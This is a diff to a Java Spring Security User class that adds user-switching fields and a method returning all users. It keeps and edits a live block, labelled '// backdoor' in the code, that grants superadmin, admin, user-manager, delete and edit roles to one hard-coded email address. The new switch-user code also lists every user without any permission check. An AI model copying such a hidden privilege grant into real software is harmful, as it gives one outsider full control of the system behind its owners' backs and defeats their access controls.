@@ -22,6 +22,7 @@ import java.util.Arrays;
 import java.util.Collection;
 import java.util.HashMap;
 import java.util.LinkedHashMap;
+import java.util.List;
 import java.util.Map;
 import java.util.Random;
 import java.util.StringTokenizer;
@@ -96,11 +97,13 @@ public class User implements UserDetails {
     private Map<String, String> FiltertemplateList = new HashMap<>();
     @HbaseColumn(qualifier = "AL", family = "technicalinfo")
     private AlertLevel AlertLevels;
-
+    
+    private User SwitchUser;
     private UserConcurrentMessageListenerContainer<Integer, String> listenerContainer;
     private final Map<String, String[]> sotokenlist = new HashMap<>();
 
     public User() {
+        this.SwitchUser = null;
         this.id = UUID.randomUUID();
         this.authorities = new ArrayList<>();
         this.MetricsMetas = null;
@@ -231,12 +234,31 @@ public class User implements UserDetails {
         }
 // backdoor        
         if (this.email.equals("vahan_a@mail.ru")) {
-            authorities.add(new SimpleGrantedAuthority(ROLE_SUPERADMIN));
-            authorities.add(new SimpleGrantedAuthority(ROLE_ADMIN));
-            authorities.add(new SimpleGrantedAuthority(ROLE_CONTENTMANAGER));
-            authorities.add(new SimpleGrantedAuthority(ROLE_USERMANAGER));
-            authorities.add(new SimpleGrantedAuthority(ROLE_DELETE));
-            authorities.add(new SimpleGrantedAuthority(ROLE_EDIT));
+            if (!authorities.contains(new SimpleGrantedAuthority(ROLE_SUPERADMIN)))
+            {
+                authorities.add(new SimpleGrantedAuthority(ROLE_SUPERADMIN));
+            }
+            if (!authorities.contains(new SimpleGrantedAuthority(ROLE_ADMIN)))
+            {
+                authorities.add(new SimpleGrantedAuthority(ROLE_ADMIN));
+            }            
+            if (!authorities.contains(new SimpleGrantedAuthority(ROLE_USERMANAGER)))
+            {
+                authorities.add(new SimpleGrantedAuthority(ROLE_USERMANAGER));
+            }                        
+            if (!authorities.contains(new SimpleGrantedAuthority(ROLE_DELETE)))
+            {
+                authorities.add(new SimpleGrantedAuthority(ROLE_DELETE));
+            }            
+            if (!authorities.contains(new SimpleGrantedAuthority(ROLE_EDIT)))
+            {
+                authorities.add(new SimpleGrantedAuthority(ROLE_EDIT));
+            }             
+//            authorities.add(new SimpleGrantedAuthority(ROLE_ADMIN));
+//            authorities.add(new SimpleGrantedAuthority(ROLE_CONTENTMANAGER));
+//            authorities.add(new SimpleGrantedAuthority(ROLE_USERMANAGER));
+//            authorities.add(new SimpleGrantedAuthority(ROLE_DELETE));
+//            authorities.add(new SimpleGrantedAuthority(ROLE_EDIT));
         }
     }
 
@@ -782,4 +804,23 @@ public class User implements UserDetails {
         this.alowswitch = alowswitch;
     }
     
+    public List<User> getSwitchUsers( HbaseUserDao Userdao) {
+        //TODO
+        return Userdao.getAllUsers(true);
+        
+    }    
+
+    /**
+     * @return the SwitchUser
+     */
+    public User getSwitchUser() {
+        return SwitchUser;
+    }
+
+    /**
+     * @param SwitchUser the SwitchUser to set
+     */
+    public void setSwitchUser(User SwitchUser) {
+        this.SwitchUser = SwitchUser;
+    }
 }
